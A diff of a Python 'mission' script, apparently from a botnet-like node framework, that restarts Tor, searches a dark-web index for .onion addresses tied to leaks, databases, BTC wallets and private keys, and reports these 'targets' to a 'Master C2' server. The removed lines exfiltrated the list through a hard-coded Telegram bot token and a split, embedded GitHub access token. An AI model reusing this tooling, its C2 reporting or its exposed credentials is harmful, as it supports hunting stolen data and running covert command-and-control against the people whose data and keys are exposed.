@@ -1,51 +1,45 @@
-# MISSION BRAIN V27.3 - ONION HARVEST Φ
+# MISSION BRAIN V27.4 - SOCKS5H HARVEST Φ
 import os, subprocess, time, requests, base64, socket, re, threading
 
 def execute_mission(ui, ID):
-    ui.log("Iniciando Mision V27.3: Cosecha de Onions (Biblioteca de Babel)...")
+    ui.log('Iniciando Mision V27.4 (SOCKS5H Native)...')
     try:
-        # 1. Preparar Red
-        os.system("apt-get update -qq && apt-get install -y tor proxychains4 curl -qq > /dev/null 2>&1")
+        # 1. Asegurar Tor
         os.system("pkill -9 tor; sleep 2; nohup tor > /dev/null 2>&1 &")
         time.sleep(30)
         
-        # 2. Fuentes de Cosecha Masiva
-        queries = ["1Feex", "BTC", "Leak", "Database", "Wallet", "Private Key"]
+        # 2. Configurar Proxies
+        proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+        
+        # 3. Cosecha
+        queries = ["1Feex", "BTC", "Leak", "Database"]
         all_onions = []
         
         for q in queries:
-            ui.log("Cosechando para: " + q)
+            ui.log("Buscando en Ahmia: " + q)
             url = "http://juhanur2ik43jecy.onion/search/?q=" + q
-            raw = subprocess.getoutput("proxychains4 curl -s -L " + url)
-            found = re.findall(r"[a-z2-7]{56}\.onion", raw)
-            all_onions.extend(found)
-            ui.update("Cosechando...", 50, 10)
+            try:
+                r = requests.get(url, proxies=proxies, timeout=60)
+                if r.status_code == 200:
+                    found = re.findall(r"[a-z2-7]{56}\.onion", r.text)
+                    all_onions.extend(found)
+                    ui.log("Encontrados " + str(len(found)) + " targets.")
+            except Exception as e:
+                ui.log("Error en query: " + str(e)[:30])
         
         unique_onions = list(set(all_onions))
-        ui.log("Cosecha total: " + str(len(unique_onions)) + " direcciones unicas.")
         
-        # 3. Alerta y Registro
-        tg_msg = "🚜 [HARVEST] Nodo " + ID + " ha indexado " + str(len(unique_onions)) + " targets en la sombra."
-        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", 
-                      data={"chat_id": "7713278946", "text": tg_msg})
+        # 4. Reporte a Master C2 (Local)
+        MASTER = "http://127.0.0.1:9471/"
+        requests.post(MASTER, json={
+            "node_id": ID, 
+            "type": "TELEMETRY", 
+            "payload": {"label": "BABEL_INDEX", "onions": unique_onions}
+        }, timeout=10)
         
-        # 4. Exfiltracion de Indice (GitHub)
-        report = "--- BABEL INDEX " + str(ID) + " ---
-" + "
-".join(unique_onions)
-        T_F1 = "github_pat_11B43LNKI"
-        T_F2 = "0LNcIXtVPYanP_CyPZqVH8sNnWlDMzN4W9se0nhC3Fy0ad2g69a8aa9APRMTWMUAFMELmuIcS"
-        headers = {"Authorization": "token " + T_F1 + T_F2}
-        url = "https://api.github.com/repos/AGINFT/gamma-actions-test/contents/intel/babel_" + str(ID) + ".txt"
+        ui.update("COSECHA V27.4 OK", 100, 5)
+        ui.log("Indexados " + str(len(unique_onions)) + " targets.")
         
-        r_get = requests.get(url, headers=headers)
-        sha = r_get.json().get("sha") if r_get.status_code == 200 else None
-        encoded = base64.b64encode(report.encode()).decode()
-        data = {"message": "Babel Update " + str(ID), "content": encoded, "branch": "main"}
-        if sha: data["sha"] = sha
-        requests.put(url, headers=headers, json=data)
-        
-        ui.update("COSECHA COMPLETA", 100, 5)
     except Exception as e:
-        ui.log("Error V27.3: " + str(e))
+        ui.log("Error V27.4: " + str(e))
     return True
